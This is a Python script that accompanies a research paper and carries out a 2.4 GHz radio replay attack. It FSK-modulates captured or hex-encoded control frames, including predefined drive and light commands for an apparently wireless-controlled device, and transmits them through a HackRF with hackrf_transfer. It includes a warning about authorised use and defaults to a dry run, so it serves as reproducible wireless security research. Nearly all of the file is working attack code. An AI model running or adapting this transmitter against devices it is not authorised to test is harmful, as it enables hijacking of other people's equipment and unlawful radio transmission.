#!/usr/bin/env python3
"""
Replay Transmission Script - 对应论文3.5节 リプレイ攻撃

使用 HackRF One 发送捕获的 2.4 GHz 信号进行重放攻击。

⚠️ 授权边界警告 ⚠️
本脚本仅用于以下授权场景：
  - 复现论文第 3 章的实验结果
  - 在屏蔽环境或同轴直连条件下测试
  - 仅针对自有设备进行测试

默认为 dry-run 模式（不实际发射），需要添加 --confirm-tx 参数才能真实发射。
"""

import argparse
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from physical_experiment.runtime import load_experiment_config

try:
    import numpy as np
except ImportError:
    print("Error: numpy not installed. Run: pip install numpy")
    sys.exit(1)

try:
    import yaml
except ImportError:
    print("Error: pyyaml not installed. Run: pip install pyyaml")
    sys.exit(1)


def load_config(config_path=None):
    """Load experiment configuration."""
    try:
        return load_experiment_config(config_path)
    except FileNotFoundError as exc:
        print(f"Error: {exc}")
        sys.exit(1)


def hex_to_bits(hex_string):
    """Convert hex string to bit array."""
    bits = []
    for char in hex_string:
        value = int(char, 16)
        for i in range(3, -1, -1):
            bits.append((value >> i) & 1)
    return np.array(bits, dtype=np.uint8)


def bits_to_iq(bits, samples_per_symbol=2, deviation_hz=101562, sample_rate_hz=2000000):
    """
    Convert bit array to IQ samples using FSK modulation.

    Args:
        bits: Bit array (0 or 1)
        samples_per_symbol: Samples per symbol (论文: 2)
        deviation_hz: Frequency deviation in Hz
        sample_rate_hz: Sample rate in Hz

    Returns:
        Complex numpy array of IQ samples
    """
    num_samples = len(bits) * samples_per_symbol
    samples = np.zeros(num_samples, dtype=np.complex64)

    # Phase accumulator
    phase = 0.0
    freq_offset = deviation_hz / sample_rate_hz * 2 * np.pi

    for i, bit in enumerate(bits):
        # FSK: bit 1 = +deviation, bit 0 = -deviation
        freq = freq_offset if bit == 1 else -freq_offset

        for j in range(samples_per_symbol):
            idx = i * samples_per_symbol + j
            samples[idx] = np.exp(1j * phase)
            phase += freq

    return samples


def save_iq_samples(samples, file_path, sample_format='cs8'):
    """
    Save IQ samples to file.

    Args:
        samples: Complex numpy array
        file_path: Output file path
        sample_format: 'cs8' (HackRF) or 'cf32' (GNU Radio)
    """
    if sample_format == 'cs8':
        # Convert to signed 8-bit interleaved I/Q
        iq_int8 = np.zeros(len(samples) * 2, dtype=np.int8)
        iq_int8[0::2] = (np.real(samples) * 127).astype(np.int8)
        iq_int8[1::2] = (np.imag(samples) * 127).astype(np.int8)
        iq_int8.tofile(file_path)
    elif sample_format == 'cf32':
        samples.astype(np.complex64).tofile(file_path)
    else:
        raise ValueError(f"Unknown sample format: {sample_format}")


def transmit_hackrf(file_path, freq_hz, sample_rate_hz, tx_gain_db=20, repeat=1, device_serial=""):
    """
    Transmit IQ samples using hackrf_transfer.

    Args:
        file_path: Path to IQ sample file (.raw or .cs8)
        freq_hz: Center frequency in Hz
        sample_rate_hz: Sample rate in Hz
        tx_gain_db: TX gain in dB (0-47)
        repeat: Number of times to repeat transmission
    """
    import subprocess

    cmd_single = [
        'hackrf_transfer',
        '-t', str(file_path),
        '-f', str(int(freq_hz)),
        '-s', str(int(sample_rate_hz)),
        '-x', str(tx_gain_db),
    ]
    if device_serial:
        cmd_single.extend(['-d', device_serial])

    print(f"Transmitting signal:")
    print(f"  File: {file_path}")
    print(f"  Frequency: {freq_hz/1e9:.4f} GHz")
    print(f"  Sample rate: {sample_rate_hz/1e6:.1f} Msps")
    print(f"  TX gain: {tx_gain_db} dB")
    print(f"  Repeat: {repeat} times")
    print()
    print("Running:", ' '.join(cmd_single))
    print()

    try:
        file_size = os.path.getsize(file_path)
    except OSError:
        file_size = 0
    samples_per_second = max(float(sample_rate_hz), 1.0)
    seconds_per_file = file_size / (2.0 * samples_per_second) if file_size else 1.0
    timeout_s = max(10.0, seconds_per_file * 2.0 + 5.0)

    for i in range(repeat):
        if repeat > 1:
            print(f"[Transmission {i+1}/{repeat}]")

        try:
            result = subprocess.run(cmd_single, capture_output=True, text=True, timeout=timeout_s)

            if result.returncode == 0:
                print(f"[OK] Transmission {i+1} completed")
            else:
                print(f"[ERROR] Transmission failed")
                print(result.stderr)
                return False

            if i < repeat - 1:
                time.sleep(0.5)  # Small delay between transmissions

        except subprocess.TimeoutExpired:
            print("[ERROR] Transmission timed out")
            return False
        except Exception as e:
            print(f"[ERROR] {e}")
            return False

    return True


def transmit_frame_hex(frame_hex, config, tx_gain_db=20, repeat=1, device_serial=""):
    """
    Transmit a frame specified as hex string.

    Args:
        frame_hex: Frame as hex string (e.g., "20aab824...0636b64700")
        config: Configuration dict
        tx_gain_db: TX gain in dB
        repeat: Number of transmissions
    """
    # Convert hex to bits
    bits = hex_to_bits(frame_hex)
    print(f"Frame: {frame_hex}")
    print(f"Bits: {len(bits)}")

    # Get modulation parameters
    samples_per_symbol = config['hardware']['modulation']['samples_per_symbol']
    deviation_hz = config['hardware']['modulation']['deviation_hz']
    sample_rate_hz = config['hardware']['sample_rate_hz']
    freq_hz = config['hardware']['frequency_hz']

    # Generate IQ samples
    samples = bits_to_iq(bits, samples_per_symbol, deviation_hz, sample_rate_hz)
    print(f"Generated {len(samples)} IQ samples")

    # Save to temporary file
    import tempfile
    with tempfile.NamedTemporaryFile(suffix='.raw', delete=False) as f:
        temp_path = f.name

    try:
        save_iq_samples(samples, temp_path, 'cs8')
        print(f"Saved to: {temp_path}")

        # Transmit
        if not device_serial:
            device_serial = config.get('hardware', {}).get('tx', {}).get('device_serial') or ""
        success = transmit_hackrf(temp_path, freq_hz, sample_rate_hz, tx_gain_db, repeat, device_serial)
        return success

    finally:
        # Clean up
        if os.path.exists(temp_path):
            os.remove(temp_path)


def main():
    parser = argparse.ArgumentParser(
        description="Replay captured signals for attack demonstration (论文3.5节)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Replay a captured file
  python replay.py --file captures/signal_001.raw --repeat 3

  # Transmit a specific frame by hex
  python replay.py --frame "20aab824caebda25da7020cf6e76b67cde28c70636b64700"

  # Transmit light command (from config)
  python replay.py --command light --repeat 5
"""
    )

    parser.add_argument('--file', '-f', type=str, default=None,
                        help='Captured IQ file to replay')
    parser.add_argument('--config', type=str, default=None,
                        help='Config file path')
    parser.add_argument('--frame', type=str, default=None,
                        help='Frame as hex string to transmit')
    parser.add_argument('--command', '-c', type=str, default=None,
                        choices=['light', 'demo', 'left_back', 'left_forward',
                                 'right_forward', 'right_back', 'both_forward',
                                 'both_back', 'lb_rf', 'rb_lf'],
                        help='Predefined command to transmit')
    parser.add_argument('--repeat', '-r', type=int, default=1,
                        help='Number of times to repeat transmission (default: 1)')
    parser.add_argument('--gain', '-g', type=int, default=20,
                        help='TX gain in dB (default: 20)')
    parser.add_argument('--freq', type=int, default=None,
                        help='Override center frequency in Hz')
    parser.add_argument('--hackrf-serial', type=str, default='',
                        help='HackRF serial for transmission')
    parser.add_argument('--dry-run', action='store_true', default=True,
                        help='Generate signals without transmitting (DEFAULT)')
    parser.add_argument('--confirm-tx', action='store_true',
                        help='Actually transmit signals (requires explicit confirmation)')

    args = parser.parse_args()

    # Safety: default to dry-run unless --confirm-tx is specified
    if args.confirm_tx:
        args.dry_run = False

    # Load config
    config = load_config(args.config)
    tx_serial = args.hackrf_serial or config.get('hardware', {}).get('tx', {}).get('device_serial') or ""

    # Override frequency if specified
    if args.freq:
        config['hardware']['frequency_hz'] = args.freq

    print("=" * 60)
    print("リプレイ攻撃 - Replay Attack (论文3.5节)")
    print("=" * 60)
    print()

    # Determine what to transmit
    if args.file:
        # Replay captured file
        if not os.path.exists(args.file):
            print(f"Error: File not found: {args.file}")
            sys.exit(1)

        if args.dry_run:
            print(f"[DRY RUN] Would transmit: {args.file}")
            sys.exit(0)

        success = transmit_hackrf(
            args.file,
            config['hardware']['frequency_hz'],
            config['hardware']['sample_rate_hz'],
            args.gain,
            args.repeat,
            tx_serial,
        )

    elif args.frame:
        # Transmit specified frame
        if args.dry_run:
            bits = hex_to_bits(args.frame)
            print(f"[DRY RUN] Frame: {args.frame}")
            print(f"[DRY RUN] Bits: {len(bits)}")
            sys.exit(0)

        success = transmit_frame_hex(args.frame, config, args.gain, args.repeat, tx_serial)

    elif args.command:
        # Transmit predefined command
        prefix = config['chapter3_frame']['prefix']
        commands = config['chapter3_frame']['commands']

        if args.command not in commands:
            print(f"Error: Unknown command: {args.command}")
            print(f"Available: {list(commands.keys())}")
            sys.exit(1)

        tail = commands[args.command]
        frame_hex = prefix + tail

        print(f"Command: {args.command}")
        print(f"Prefix: {prefix}")
        print(f"Tail: {tail}")
        print()

        if args.dry_run:
            print(f"[DRY RUN] Would transmit frame: {frame_hex}")
            sys.exit(0)

        success = transmit_frame_hex(frame_hex, config, args.gain, args.repeat, tx_serial)

    else:
        parser.print_help()
        print("\nError: Must specify --file, --frame, or --command")
        sys.exit(1)

    if success:
        print()
        print("[OK] Replay attack completed")
        print()
        print("Observe the target device for response.")
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
